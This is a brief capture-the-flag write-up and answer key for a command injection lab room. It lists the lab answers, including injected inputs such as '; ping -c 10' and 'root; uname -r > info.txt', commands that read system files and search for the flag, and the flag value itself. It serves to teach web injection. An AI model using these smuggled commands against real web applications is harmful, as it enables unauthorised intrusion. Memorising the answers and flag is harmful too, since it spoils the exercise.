#HackThebox Injection

#Saikat Karmakar | Nov 29:2020

#Task 1 & 2
```
no ans. needed
```
#Task 3:Blind Command Injection 

1. Ping the box with 10 packets.  What is this command (without IP address)?
```
; ping -c 10
```
2. Redirect the box's Linux Kernel Version to a file on the web server.  What is 	the Linux Kernel Version?

root; uname -r > info.txt
then go to the info.txt dir
```
4.15.0-101
```

3. Enter "root" into the input and review the alert.  What type of alert do you get?
```
Success
```

4. Enter "www-data" into the input and review the alert.  What type of alert do you get?
```
Success
```

5. Enter your name into the input and review the alert.What type of alert do you get?
```
Error
```

#Task 4: Active Command Injection 

1. What strange text file is in the website root directory?
```
drpepper.txt
```
2. How many non-root/non-service/non-daemon users are there?
```
0
```
3. What user is this app running as?
```
www-data
```
4. What is the user's shell set as?
```
/usr/sbin/nologin
```
5. What version of Ubuntu is running?
```
18.04.4
```
6. Print out the MOTD.  What favorite beverage is shown?
cat /etc/update-motd.d/00-header
```
DR PEPPER
```

#Task 5: Get The Flag! 

1. Get the flag!
find / 2>>/dev/null | grep -i "flag"
```
65fa0513383ee486f89450160f3aa4c4
```









